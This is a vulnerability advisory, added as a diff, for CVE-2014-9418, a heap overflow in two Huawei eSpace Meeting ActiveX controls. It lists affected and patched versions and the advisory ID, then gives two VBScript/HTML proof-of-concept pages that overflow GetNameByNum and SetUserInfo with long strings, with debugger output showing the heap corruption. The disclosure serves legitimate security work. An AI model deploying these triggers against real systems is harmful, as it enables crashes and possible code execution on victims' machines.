@@ -1,0 +1,85 @@
+Huawei eSpace Meeting ContactsCtrl.dll and eSpaceStatusCtrl.dll ActiveX Heap Overflow
+
+
+Vendor: Huawei Technologies Co., Ltd.
+Product web page: https://www.huawei.com
+Affected version: eSpace 1.1.11.103 (aka eSpace ECS, eSpace Desktop, eSpace Meeting, eSpace UC)
+                  eSpace UC V200R002C02
+
+Summary: Create more convenient Enhanced Communications (EC) services for your
+enterprise with this suite of products. Huawei’s EC Suite (ECS) solution combines
+voice, data, video, and service streams, and provides users with easy and secure
+access to their service platform from any device, in any place, at any time. The
+eSpace Meeting allows you to join meetings that support voice, data, and video
+functions using the PC client, the tablet client, or an IP phone, or in a meeting
+room with an MT deployed.
+
+Desc: eSpace Meeting suffers from a heap-based memory overflow vulnerability when parsing
+large amount of bytes to the 'strNum' string parameter in GetNameyNum() in 'ContactsCtrl.dll'
+and 'strName' string parameter in SetUserInfo() in eSpaceStatusCtrl.dll library, resulting
+in heap memory corruption. An attacker can gain access to the system of the affected node
+and execute arbitrary code.
+
+Vuln ActiveX controls:
+C:\Program Files\eSpace-ecs\ContactsCtrl.dll
+C:\Program Files\eSpace-ecs\eSpaceStatusCtrl.dll
+
+Tested on: Microsoft Windows 7 Professional
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+
+23.09.2014
+
+Patched version: V200R001C03
+Vuln ID: HWPSIRT-2014-1157
+CVE ID: CVE-2014-9418
+Advisory: https://www.huawei.com/en/psirt/security-advisories/hw-406589
+
+--
+
+
+ContactsCtrl.dll PoC and debug output:
+
+<object classid='clsid:B53B93C2-6B0D-4D30-B46D-12F64E809B6D' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\eSpace-ecs\ContactsCtrl.dll"
+prototype  = "Function GetNameByNum ( ByVal strNum As String ) As String"
+memberName = "GetNameByNum"
+progid     = "ContactsCtrlLib.ContactWnd"
+argCount   = 1
+arg1=String(616400, "A")
+target.GetNameByNum arg1 
+
+0:000> d esi
+04170024  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170034  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170044  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170054  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170064  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170074  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170084  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+04170094  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+
+
+eSpaceStatusCtrl.dll PoC and debug output:
+
+<object classid='clsid:93A44D3B-7CED-454F-BBB4-EE0AA340BB78' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\eSpace-ecs\eSpaceStatusCtrl.dll"
+prototype  = "Sub SetUserInfo ( ByVal strAccount As String ,  ByVal staffNo As String ,  ByVal strName As String ,  ByVal status As Long )"
+memberName = "SetUserInfo"
+progid     = "eSpaceStatusCtrlLib.StatusCtrl"
+argCount   = 4
+arg1="defaultV"
+arg2="defaultV"
+arg3=String(14356, "A")
+arg4=1
+target.SetUserInfo arg1 ,arg2 ,arg3 ,arg4 
+
+0:005> r
+eax=feeefeee ebx=02813550 ecx=feeefeee edx=feeefeee esi=0281369c edi=02813698
+eip=776def10 esp=029dfd60 ebp=029dfd74 iopl=0         nv up ei ng nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293
+ntdll!RtlEnterCriticalSection+0x4a:
+776def10 83790800        cmp     dword ptr [ecx+8],0  ds:0023:feeefef6=????????
